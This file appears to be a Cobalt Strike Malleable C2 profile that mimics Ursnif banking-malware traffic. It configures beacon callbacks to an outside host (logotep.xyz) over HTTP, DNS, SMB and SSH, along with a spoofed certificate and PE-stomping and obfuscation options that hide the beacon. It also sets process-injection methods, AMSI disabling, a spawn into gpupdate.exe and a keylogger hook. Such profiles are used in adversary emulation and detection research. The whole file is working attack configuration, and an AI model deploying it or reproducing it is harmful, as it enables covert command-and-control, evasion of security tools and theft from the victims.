#ursnif_ransomware.profile
#https://www.mandiant.com/resources/blog/rm3-ldr4-ursnif-banking-fraud
#https://unit42.paloaltonetworks.com/wireshark-tutorial-examining-ursnif-infections/
#xx0hcd

###Global Options###
set sample_name "ursnif_ransomware.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36";
set data_jitter "50";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###Steal Token
set steal_token_access_mask "0";

###Proxy Options
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

###SSL Options###
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

#https://www.virustotal.com/gui/ip-address/45.148.164.4/details
https-certificate {
    set C "NL";
    set CN "STARK INDUSTRIES SOLUTIONS LTD";
    set L "London";
    set O "STARK INDUSTRIES SOLUTIONS LTD";
    set OU "OTHER";
    set ST "NL";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#http-config {
#    set headers "Server, Content-Type";
#    header "Server" "nginx";
#
#    set trust_x_forwarded_for "false";
#    
#    set block_useragents "curl*,lynx*,wget*";
#}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/index.htm";

    #set verb "POST";
    
    client {

        header "Host" "logotep.xyz";
        header "Cache-Control" "no-cache";
        header "Connection" "Keep-Alive";
        header "Pragma" "no-cache";

    parameter "clypnrkl" "wsktexbmn";
    parameter "version" "100123";
    parameter "user" "f2472a25a2e15c3d";
    parameter "group" "202208152";
    parameter "system" "18245c7ff14d7902";
    
    metadata {
        #base64
        base64url;

        parameter "file";

    }
    parameter "crc" "00000000";
    parameter "size" "0";
    }

    server {
        header "Server" "Apache";
        header "Last-Modified" "Wed, 13 Nov 2019 12:17:18 GMT";
        header "Accept-Ranges" "bytes";
        header "Content-Type" "application/x-rar-compressed";
 
        output {

            netbios;

            print;
        }
    }
}

###HTTP-Post Block###
http-post {
    
    set uri "/index.html";

    client {
	
	#adding parameters to POST URI anyway..
	parameter "clypnrkl" "wsktexbmn";
        parameter "version" "100123";
        parameter "user" "f2472a25a2e15c3d";
        parameter "group" "202208152";
        parameter "system" "18245c7ff14d7902";
        parameter "file" "8fd8a91e";
        parameter "crc" "00000000";
	
	header "Host" "logotep.xyz";
        header "Cache-Control" "no-cache";
        header "Connection" "Keep-Alive";
        header "Pragma" "no-cache";
        header "Content-Type" "multipart/form-data; boundary=9808fdecfe274c1d";     
        
        output {
            #base64url; 
	    #parameter "file";
	    netbios;
	    
	    prepend "--9808fdecfe274c1d

Content-Disposition: form-data; name=\"rcgmbh\"\n";

	    append "\n--9808fdecfe274c1d--";
	    
	    print;
        }
	
        id {
	    base64url;
	    parameter "size";

        }
        
    }

    server {
        header "Server" "Apache";
        header "Last-Modified" "Wed, 13 Nov 2019 12:17:18 GMT";

        output {
            netbios;

            print;
        }
    }
}


###HTTP-Stager Block###
http-stager {

    set uri_x86 "/Console";
    set uri_x64 "/console";

    client {
        header "Host" "whatever.com";
        header "Connection" "close";
	
	#parameter "test1" "test2";
    }

    server {
        #header "Server" "nginx";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
#peclone https://app.any.run/tasks/001f18b0-a19b-4091-a46b-5b27c8208b2f/
stage {
    set checksum        "0";
    set compile_time    "09 Jun 2022 11:25:23";
    set entry_point     "11448";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "LOADER.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "\xcf\xb1\x1b\x70\x8b\xd0\x75\x23\x8b\xd0\x75\x23\x8b\xd0\x75\x23\x82\xa8\xe6\x23\x83\xd0\x75\x23\x8b\xd0\x74\x23\xdb\xd0\x75\x23\x48\xdf\x28\x23\x88\xd0\x75\x23\x48\xdf\x2a\x23\x89\xd0\x75\x23\x48\xdf\x7a\x23\x88\xd0\x75\x23\x82\xa8\xfc\x23\xab\xd0\x75\x23\x82\xa8\xe7\x23\x8a\xd0\x75\x23\x82\xa8\xe4\x23\x8a\xd0\x75\x23\x52\x69\x63\x68\x8b\xd0\x75\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #new 4.2. options   
    #set allocator "HeapAlloc";
    #set magic_mz_x86 "MZRE";
    #set magic_mz_x64 "MZAR";
    #set magic_pe "PE";
    
    set sleep_mask "true";
    set smartinject "true";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    stringw "LOADER.dll";
    stringw "DllRegisterServer";
    stringw ".bss";
    stringw "3D 2E 62 73 73 74 0A 48 83 C7 28";
    stringw "|SPL|";

}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";
    
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart";
    set pipename "DserNamePipe##";
    set keylogger "SetWindowsHookEx";

}
